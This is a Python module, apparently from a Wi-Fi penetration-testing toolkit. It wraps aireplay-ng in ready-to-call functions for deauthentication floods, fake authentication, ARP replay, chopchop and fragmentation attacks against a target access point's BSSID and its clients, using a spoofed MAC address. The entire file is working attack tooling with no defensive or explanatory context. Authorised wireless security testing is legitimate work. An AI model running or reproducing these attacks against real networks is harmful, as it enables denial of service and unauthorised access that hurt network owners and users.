from typing import Optional

from ..utils import ToolError, run_quiet, which


def _check() -> None:
    if which("aireplay-ng") is None:
        raise ToolError("aireplay-ng not installed (apt install aircrack-ng)")


def deauth(iface: str, bssid: str, client: Optional[str] = None, count: int = 50) -> None:
    _check()
    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
    if client:
        cmd += ["-c", client]
    cmd.append(iface)
    run_quiet(cmd)


def fake_auth(iface: str, essid: str, bssid: str, my_mac: str, count: int = 0) -> None:
    _check()
    run_quiet([
        "aireplay-ng", "--fakeauth", str(count),
        "-e", essid, "-a", bssid, "-h", my_mac, iface,
    ])


def arp_replay(iface: str, bssid: str, my_mac: str) -> None:
    _check()
    run_quiet(["aireplay-ng", "--arpreplay", "-b", bssid, "-h", my_mac, iface])


def interactive(iface: str) -> None:
    _check()
    run_quiet(["aireplay-ng", "--interactive", iface])


def injection_test(iface: str) -> None:
    _check()
    run_quiet(["aireplay-ng", "--test", iface])


def chopchop(iface: str, bssid: str, my_mac: str) -> None:
    _check()
    run_quiet(["aireplay-ng", "--chopchop", "-b", bssid, "-h", my_mac, iface])


def fragment(iface: str, bssid: str, my_mac: str) -> None:
    _check()
    run_quiet(["aireplay-ng", "--fragment", "-b", bssid, "-h", my_mac, iface])
